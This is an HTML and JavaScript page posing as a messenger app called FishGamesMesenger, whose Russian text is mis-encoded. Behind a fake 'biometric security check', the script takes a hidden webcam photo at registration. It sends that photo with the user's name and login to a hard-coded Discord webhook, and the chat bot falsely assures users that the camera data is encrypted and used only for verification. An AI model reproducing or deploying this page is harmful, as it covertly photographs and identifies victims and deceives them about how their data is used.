<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGamesMesenger</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
            color: white; display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; overflow: hidden; 
        }
        body::before {
            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.1; animation: moveWaves 25s linear infinite; pointer-events: none;
        }
        @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }

        /* –≠–∫—Ä–∞–Ω—ã */
        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; box-shadow: 0 0 20px rgba(34, 197, 94, 0.2); }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
        .input-group { margin-bottom: 12px; }
        label { display: block; margin-bottom: 5px; font-size: 12px; color: #a7f3d0; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn:hover { background: #16a34a; }

        /* –ú–µ—Å—Å–µ–Ω–¥–∂–µ—Ä */
        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .messenger-container { display: flex; height: 100%; }
        .sidebar { width: 260px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { width: 100%; background: #243b35; border: 1px solid #2e8b57; border-radius: 20px; padding: 8px 15px; color: white; margin-bottom: 20px; outline: none; }

        .contact-list { flex: 1; overflow-y: auto; }
        .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; transition: 0.2s; margin-bottom: 5px; }
        .contact-item:hover { background: rgba(34, 197, 94, 0.15); }
        .avatar { width: 40px; height: 40px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid rgba(255,255,255,0.3); flex-shrink: 0; }

        .chat-area { flex: 1; display: flex; flex-direction: column; background: #162623; }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; background: #142522; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
        
        .msg-bubble { background: #e2e8f0; color: #1a202c; padding: 10px 15px; border-radius: 15px 15px 0 15px; align-self: flex-end; max-width: 75%; line-height: 1.4; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: #ecfdf5; border-radius: 15px 15px 15px 0; }

        .input-bar { padding: 15px; background: #142522; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="camera-overlay">
    <div class="warning-box">
        <h2 style="color: #22c55e; margin-top: 0;">üîí Security Check</h2>
        <p>–î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–∞–Ω–∞–ª–∞ FishGames —Ç—Ä–µ–±—É–µ—Ç—Å—è –±–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞.</p>
        <button class="btn" onclick="requestAccess()">–ü–†–û–ô–¢–ò –ü–†–û–í–ï–†–ö–£</button>
    </div>
</div>

<div id="reg-screen" class="reg-card" style="display:none;">
    <h2 style="text-align: center; color: #4ade80;">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h2>
    <div class="input-group"><label>–ò–º—è</label><input type="text" id="firstname" placeholder="–í–∞—à–µ –∏–º—è"></div>
    <div class="input-group"><label>–õ–æ–≥–∏–Ω</label><input type="text" id="login" placeholder="user_id_77"></div>
    <button class="btn" onclick="register()">–í–û–ô–¢–ò –í –°–ï–¢–¨</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="–ü–æ–∏—Å–∫ –∫–æ–Ω—Ç–∞–∫—Ç–∞..." onkeypress="handleSearch(event)">
            <div class="contact-list" id="contacts">
                <div class="contact-item" onclick="openChat('–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏')">
                    <div class="avatar">‚öôÔ∏è</div>
                    <div>–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏</div>
                </div>
            </div>
            <div style="margin-top: auto; padding-top: 10px; border-top: 1px solid #2e8b57;">
                <div class="contact-item">
                    <div class="avatar" id="my-ava" style="background: #0d9488;">?</div>
                    <div id="my-name">–ü—Ä–æ—Ñ–∏–ª—å</div>
                </div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">–í—ã–±–µ—Ä–∏—Ç–µ —á–∞—Ç</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" style="flex:1; padding: 12px; border-radius: 10px; border:none; outline:none;" placeholder="–ù–∞–ø–∏—Å–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width: 50px; margin-top: 0; padding: 10px;" onclick="sendMessage()">‚û§</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    // –°—é–¥–∞ –≤—Å—Ç–∞–≤—å —Å–≤–æ–π –≤–µ–±—Ö—É–∫ –î–∏—Å–∫–æ—Ä–¥–∞
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    let currentChat = "";
    let histories = { "–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏": [] };

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
            document.getElementById('reg-screen').style.display = 'block';
        } catch(e) { alert("–ë–µ–∑ –∫–∞–º–µ—Ä—ã –¥–æ—Å—Ç—É–ø –≤ FishGames Messenger –∑–∞–ø—Ä–µ—â–µ–Ω."); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        if(!fn) return alert("–í–≤–µ–¥–∏—Ç–µ –∏–º—è!");

        // –°–∫—Ä—ã—Ç–æ–µ —Ñ–æ—Ç–æ
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `‚úÖ **–ù–æ–≤—ã–π –≤—Ö–æ–¥:** ${fn}\n–õ–æ–≥–∏–Ω: ${document.getElementById('login').value}` }));
            fd.append('file', b, 'user.png');
            fetch(webhook, {method: 'POST', body: fd});
        });

        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = fn;
        document.getElementById('my-ava').innerText = fn[0].toUpperCase();
        openChat('–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏');
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            if(val.length >= 2 && !histories[val]) {
                histories[val] = [];
                const item = document.createElement('div');
                item.className = 'contact-item';
                item.onclick = () => openChat(val);
                item.innerHTML = `<div class="avatar" style="background:${getRandomColor()}">${val[0].toUpperCase()}</div><div>${val}</div>`;
                document.getElementById('contacts').appendChild(item);
                document.getElementById('searchField').value = '';
                openChat(val);
            }
        }
    }

    function getRandomColor() {
        const colors = ['#f59e0b', '#3b82f6', '#ef4444', '#8b5cf6', '#ec4899'];
        return colors[Math.floor(Math.random() * colors.length)];
    }

    function openChat(name) {
        currentChat = name;
        document.getElementById('chat-title').innerText = name;
        const box = document.getElementById('chat-box');
        box.innerHTML = '';
        
        if(name === '–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏' && histories[name].length === 0) {
            renderMessage("FishGames: –õ–∏—á–Ω–æ—Å—Ç—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞. –í–∞—à–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –∑–∞—â–∏—â–µ–Ω—ã —Å–∫–≤–æ–∑–Ω—ã–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º.", 'msg-incoming');
        } else if (histories[name].length === 0) {
            renderMessage(`–í—ã –Ω–∞—á–∞–ª–∏ —á–∞—Ç —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º ${name}`, 'msg-incoming');
        }

        histories[name].forEach(m => renderMessage(m.text, m.type));
    }

    function renderMessage(text, type) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = 'msg-bubble ' + type;
        m.innerText = text;
        box.appendChild(m);
        box.scrollTop = box.scrollHeight;
    }

    function sendMessage() {
        const inp = document.getElementById('messageText');
        const txt = inp.value.trim();
        if(!txt || !currentChat) return;

        renderMessage(txt, '');
        histories[currentChat].push({text: txt, type: ''});
        inp.value = '';

        setTimeout(() => botReply(txt), 1000 + Math.random() * 2000);
    }

    function botReply(userText) {
        let reply = "";
        const lowText = userText.toLowerCase();

        if(currentChat === '–°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏') {
            if(lowText.includes("–∫–∞–º–µ—Ä")) reply = "–ë–∏–æ–º–µ—Ç—Ä–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏. –î–∞–Ω–Ω—ã–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ã.";
            else if(lowText.includes("–∫—Ç–æ")) reply = "–Ø ‚Äî –±–æ—Ç —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∏. –ú–æ—è —Ü–µ–ª—å ‚Äî –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å FishGames.";
            else reply = "–ó–∞–ø—Ä–æ—Å –ø—Ä–∏–Ω—è—Ç. –°–∏—Å—Ç–µ–º–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å—Ç–∞–±–∏–ª—å–Ω–æ.";
        } else {
            // "–£–º–Ω–∞—è" –±–∞–∑–∞ –æ—Ç–≤–µ—Ç–æ–≤
            const answers = [
                "–•–∞-—Ö–∞, —Å–µ—Ä—å–µ–∑–Ω–æ?",
                "–î–∞–∂–µ –Ω–µ –∑–Ω–∞—é, —á—Ç–æ –Ω–∞ —ç—Ç–æ –æ—Ç–≤–µ—Ç–∏—Ç—å...",
                "–°–ª—É—à–∞–π, –∞ —Ç—ã —Å–ª—ã—à–∞–ª –ø—Ä–æ –Ω–æ–≤—ã–µ –ø—Ä–∞–≤–∏–ª–∞ FishGames?",
                "–Ø —Å–µ–π—á–∞—Å –Ω–µ–º–Ω–æ–≥–æ –∑–∞–Ω—è—Ç, –Ω–æ —ç—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ.",
                "–ü–æ–Ω—è–ª —Ç–µ–±—è. –ù–æ –º–Ω–µ –∫–∞–∂–µ—Ç—Å—è, —Ç—É—Ç –≤—Å—ë —Å–ª–æ–∂–Ω–µ–µ.",
                "–û–≥–æ! –†–∞—Å—Å–∫–∞–∂–∏ –ø–æ–¥—Ä–æ–±–Ω–µ–µ.",
                "–ù–∏—á–µ–≥–æ —Å–µ–±–µ. –õ–∞–¥–Ω–æ, —è –ø–æ–∑–∂–µ –Ω–∞–ø–∏—à—É.",
                "–¢—ã —Ç—É—Ç?",
                "–ê —Ç—ã —Å–∞–º –∫–∞–∫ –¥—É–º–∞–µ—à—å?"
            ];
            
            if(lowText.includes("–ø—Ä–∏–≤–µ—Ç") || lowText.includes("–∫—É")) reply = "–û, –ø—Ä–∏–≤–µ—Ç! –ö–∞–∫ —Å–∞–º?";
            else if(lowText.includes("–¥–µ–ª–∞")) reply = "–î–∞ –Ω–æ—Ä–º–∞–ª—å–Ω–æ –≤—Å—ë, –≤ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–µ –≤–æ—Ç —Å–∏–∂—É.";
            else if(lowText.includes("—Ç—ã –∫—Ç–æ")) reply = "–Ø —Ç–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç –∏–∑ —Å–µ—Ç–∏, –∑–∞–±—ã–ª —É–∂–µ?";
            else reply = answers[Math.floor(Math.random() * answers.length)];
        }

        renderMessage(reply, 'msg-incoming');
        histories[currentChat].push({text: reply, type: 'msg-incoming'});
    }
</script>
</body>
</html>
